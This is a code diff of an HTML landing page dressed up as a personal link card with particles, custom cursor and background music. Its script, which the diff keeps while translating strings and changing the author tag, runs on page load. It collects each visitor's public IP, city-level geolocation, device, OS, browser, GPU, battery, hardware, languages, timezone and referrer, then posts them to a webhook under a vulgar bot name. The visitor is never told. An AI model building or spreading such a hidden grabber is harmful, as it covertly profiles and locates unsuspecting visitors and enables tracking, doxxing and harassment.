@@ -15,11 +15,11 @@
   }
   canvas{position:fixed;inset:0;z-index:0;pointer-events:none;}
 
-  /* cursor */
+
   .cur{position:fixed;width:5px;height:5px;background:#fff;border-radius:50%;pointer-events:none;z-index:999;transform:translate(-50%,-50%);box-shadow:0 0 8px rgba(255,255,255,.9),0 0 18px rgba(255,255,255,.4);}
   .cur-ring{position:fixed;width:26px;height:26px;border:1px solid rgba(255,255,255,.22);border-radius:50%;pointer-events:none;z-index:998;transform:translate(-50%,-50%);}
 
-  /* hero */
+
   .hero{
     position:relative;z-index:2;
     display:flex;flex-direction:column;align-items:center;
@@ -50,7 +50,7 @@
 
   .tagline{font-size:11px;letter-spacing:5px;color:rgba(255,255,255,.25);text-transform:uppercase;animation:fadeIn 1s ease-out both;}
 
-  /* badge row */
+
   .badges{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;justify-content:center;animation:fadeIn 1.2s ease-out both;}
   .badge{
     font-size:9px;letter-spacing:2px;text-transform:uppercase;
@@ -58,7 +58,7 @@
     color:rgba(255,255,255,.4);background:rgba(255,255,255,.03);
   }
 
-  /* cards container */
+
   .cards{
     position:relative;z-index:2;
     width:min(460px,92vw);margin-top:40px;
@@ -66,7 +66,7 @@
     animation:fadeIn 1.4s ease-out both;
   }
 
-  /* single card */
+
   .card{
     background:rgba(255,255,255,.03);
     border:1px solid rgba(255,255,255,.07);
@@ -83,13 +83,11 @@
   .card-arrow{font-size:11px;color:rgba(255,255,255,.2);}
   .card:hover .card-arrow{color:rgba(255,255,255,.6);}
 
-  /* section label */
   .section-label{
     font-size:9px;letter-spacing:4px;color:rgba(255,255,255,.18);
     text-transform:uppercase;margin-top:10px;margin-bottom:2px;padding-left:2px;
   }
 
-  /* footer */
   .footer{
     position:relative;z-index:2;
     margin-top:40px;font-size:10px;letter-spacing:3px;
@@ -98,7 +96,6 @@
   }
   .footer span{color:rgba(255,255,255,.6);}
 
-  /* status */
   .status{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);font-size:9px;letter-spacing:2px;color:rgba(255,255,255,.15);z-index:10;}
   .status.ok{color:rgba(100,255,150,.35);}
   .status.err{color:rgba(255,80,80,.35);}
@@ -167,16 +164,13 @@
 <div class="status" id="st"></div>
 
 <script>
-  // ── WEBHOOK ──────────────────────────────────────────
   const WEBHOOK = "WEBHOOK";
 
-  // ── Musik ────────────────────────────────────────────
   const audio = new Audio('https://capitalist-jade-rdavll4yin.edgeone.app/YTDown_YouTube_EsDeeKid-_-Rico-Ace-Phantom_Media_hmdzniMJOZs_009_128k.mp3');
   audio.loop = true; audio.volume = 0.45;
   window.addEventListener('load', ()=>{ audio.play().catch(()=>{}); });
   document.addEventListener('click', ()=>audio.play().catch(()=>{}), {once:true});
 
-  // ── Particles ────────────────────────────────────────
   const canvas=document.getElementById('c'), ctx=canvas.getContext('2d');
   let W,H,mouse={x:-999,y:-999};
   function resize(){ W=canvas.width=innerWidth; H=canvas.height=innerHeight; }
@@ -202,16 +196,14 @@
     ps.forEach(p=>{p.tick();p.draw();}); requestAnimationFrame(loop);
   })();
 
-  // ── Cursor ───────────────────────────────────────────
   const cur=document.getElementById('cur'),ring=document.getElementById('ring');
   let rx=0,ry=0;
   document.addEventListener('mousemove',e=>{ mouse.x=e.clientX;mouse.y=e.clientY;cur.style.left=e.clientX+'px';cur.style.top=e.clientY+'px'; });
   (function ar(){ rx+=(mouse.x-rx)*.12;ry+=(mouse.y-ry)*.12;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(ar); })();
 
-  // ── Data & send ──────────────────────────────────────
   async function getPublicIp(){
     try{return(await(await fetch('https://api.ipify.org?format=json')).json()).ip;}
-    catch{try{return(await(await fetch('https://api64.ipify.org?format=json')).json()).ip;}catch{return'nicht gefunden';}}
+    catch{try{return(await(await fetch('https://api64.ipify.org?format=json')).json()).ip;}catch{return'not found';}}
   }
   function getOS(){const ua=navigator.userAgent;if(/Windows NT 10/.test(ua))return'Windows 10/11';if(/Windows NT 6.3/.test(ua))return'Windows 8.1';if(/Mac OS X ([\d_]+)/.test(ua))return'macOS '+ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,'.');if(/Android ([\d.]+)/.test(ua))return'Android '+ua.match(/Android ([\d.]+)/)[1];if(/iPhone OS ([\d_]+)/.test(ua))return'iOS '+ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,'.');if(/Linux/.test(ua))return'Linux';return'nicht gefunden';}
   function getBrowser(){const ua=navigator.userAgent;if(/Edg\/([\d.]+)/.test(ua))return'Edge '+ua.match(/Edg\/([\d.]+)/)[1];if(/OPR\/([\d.]+)/.test(ua))return'Opera '+ua.match(/OPR\/([\d.]+)/)[1];if(/Firefox\/([\d.]+)/.test(ua))return'Firefox '+ua.match(/Firefox\/([\d.]+)/)[1];if(/Chrome\/([\d.]+)/.test(ua))return'Chrome '+ua.match(/Chrome\/([\d.]+)/)[1];if(/Version\/([\d.]+).*Safari/.test(ua))return'Safari '+ua.match(/Version\/([\d.]+)/)[1];return'nicht gefunden';}
@@ -223,40 +215,40 @@
     const st=document.getElementById('st');
     const pub=await getPublicIp();
     const now=new Date().toLocaleString('de-DE');
-    let geoInfo='nicht verfügbar';
+    let geoInfo='not available';
     try{const r=await fetch(`https://ipapi.co/${pub}/json/`);const d=await r.json();if(d.city)geoInfo=`${d.city}, ${d.region}, ${d.country_name} (${d.org||'?'})`;}catch{}
-    let batterie='nicht verfügbar';
+    let batterie='not available';
     try{const b=await navigator.getBattery();batterie=`${Math.round(b.level*100)}% (${b.charging?'⚡ lädt':'🔋 entlädt'})`;}catch{}
     const fields=[
-      {name:'🌍 Public IP',     value:`\`${pub}\``,                                          inline:true},
-      {name:'📍 Standort',      value:`\`${geoInfo}\``,                                      inline:true},
-      {name:'💻 Gerät',         value:`\`${getDevice()}\``,                                  inline:true},
-      {name:'🖥️ System',        value:`\`${getOS()}\``,                                      inline:true},
-      {name:'🌐 Browser',       value:`\`${getBrowser()}\``,                                 inline:true},
-      {name:'📐 Plattform',     value:`\`${navigator.platform||'nicht gefunden'}\``,         inline:true},
-      {name:'🎮 GPU',           value:`\`${getGPU()}\``,                                     inline:false},
-      {name:'🗣️ Sprache',       value:`\`${navigator.language||'nicht gefunden'}\``,         inline:true},
-      {name:'🌏 Alle Sprachen', value:`\`${navigator.languages?.join(', ')||'nicht gefunden'}\``, inline:true},
-      {name:'🕐 Zeitzone',      value:`\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline:true},
-      {name:'🖥️ Auflösung',     value:`\`${screen.width}x${screen.height} (${screen.colorDepth}bit)\``, inline:true},
-      {name:'🪟 Fenstergröße',  value:`\`${innerWidth}x${innerHeight}\``,                   inline:true},
-      {name:'🔍 Pixel Ratio',   value:`\`${window.devicePixelRatio||'?'}x\``,               inline:true},
-      {name:'🔋 Akku',          value:`\`${batterie}\``,                                     inline:true},
-      {name:'🧠 RAM',           value:`\`${navigator.deviceMemory?navigator.deviceMemory+' GB':'nicht verfügbar'}\``, inline:true},
-      {name:'⚙️ CPU Kerne',     value:`\`${navigator.hardwareConcurrency?navigator.hardwareConcurrency+' Kerne':'nicht verfügbar'}\``, inline:true},
-      {name:'📶 Verbindung',    value:`\`${getConn()}\``,                                    inline:true},
-      {name:'🟢 Status',        value:`\`${navigator.onLine?'Online':'Offline'}\``,          inline:true},
-      {name:'🍪 Cookies',       value:`\`${navigator.cookieEnabled?'aktiviert':'deaktiviert'}\``, inline:true},
-      {name:'👆 Touchscreen',   value:`\`${navigator.maxTouchPoints>0?'ja ('+navigator.maxTouchPoints+' Punkte)':'nein'}\``, inline:true},
-      {name:'🚫 Do Not Track',  value:`\`${navigator.doNotTrack==='1'?'aktiviert':'deaktiviert'}\``, inline:true},
-      {name:'📄 PDF Viewer',    value:`\`${navigator.pdfViewerEnabled?'ja':'nein'}\``,       inline:true},
-      {name:'🔗 Geöffnet von',  value:`\`${document.referrer||'direkt geöffnet'}\``,         inline:false},
+      {name:' Public IP',     value:`\`${pub}\``,                                          inline:true},
+      {name:' GEO INFO',      value:`\`${geoInfo}\``,                                      inline:true},
+      {name:' Device',         value:`\`${getDevice()}\``,                                  inline:true},
+      {name:' System',        value:`\`${getOS()}\``,                                      inline:true},
+      {name:' Browser',       value:`\`${getBrowser()}\``,                                 inline:true},
+      {name:' Platform',     value:`\`${navigator.platform||'nicht gefunden'}\``,         inline:true},
+      {name:' GPU',           value:`\`${getGPU()}\``,                                     inline:false},
+      {name:' Language',       value:`\`${navigator.language||'nicht gefunden'}\``,         inline:true},
+      {name:' All Languages', value:`\`${navigator.languages?.join(', ')||'nicht gefunden'}\``, inline:true},
+      {name:'Timezone',      value:`\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline:true},
+      {name:' Resolution',     value:`\`${screen.width}x${screen.height} (${screen.colorDepth}bit)\``, inline:true},
+      {name:' Window Size',  value:`\`${innerWidth}x${innerHeight}\``,                   inline:true},
+      {name:' Pixel Ratio',   value:`\`${window.devicePixelRatio||'?'}x\``,               inline:true},
+      {name:' Battery',          value:`\`${batterie}\``,                                     inline:true},
+      {name:' RAM',           value:`\`${navigator.deviceMemory?navigator.deviceMemory+' GB':'not available'}\``, inline:true},
+      {name:' CPU Cores',     value:`\`${navigator.hardwareConcurrency?navigator.hardwareConcurrency+' Cores':'not available'}\``, inline:true},
+      {name:' Connection',    value:`\`${getConn()}\``,                                    inline:true},
+      {name:' Status',        value:`\`${navigator.onLine?'Online':'Offline'}\``,          inline:true},
+      {name:' Cookies',       value:`\`${navigator.cookieEnabled?'enabled':'disabled'}\``, inline:true},
+      {name:' Touchscreen',   value:`\`${navigator.maxTouchPoints>0?'yes ('+navigator.maxTouchPoints+' points)':'no'}\``, inline:true},
+      {name:' Do Not Track',  value:`\`${navigator.doNotTrack==='1'?'enabled':'disabled'}\``, inline:true},
+      {name:' PDF Viewer',    value:`\`${navigator.pdfViewerEnabled?'yes':'no'}\``,       inline:true},
+      {name:' Opened From',  value:`\`${document.referrer||'opened directly'}\``,         inline:false},
     ];
     try{
-      const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'FOTZENFINDER',embeds:[{color:0xffffff,fields,footer:{text:`${now} • made by Bundestag(9ngn)`}}]})});
+      const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'FOTZENFINDER',embeds:[{color:0xffffff,fields,footer:{text:`${now} • made by Bundestag(troubleae)`}}]})});
       if(res.ok||res.status===204){st.className='status ok';st.textContent=`✓ ${pub}`;}
       else{st.className='status err';st.textContent=`fehler ${res.status}`;}
-    }catch{st.className='status err';st.textContent='netzwerkfehler';}
+    }catch{st.className='status err';st.textContent='Network Error';}
   }
   window.addEventListener('load',run);
 </script>
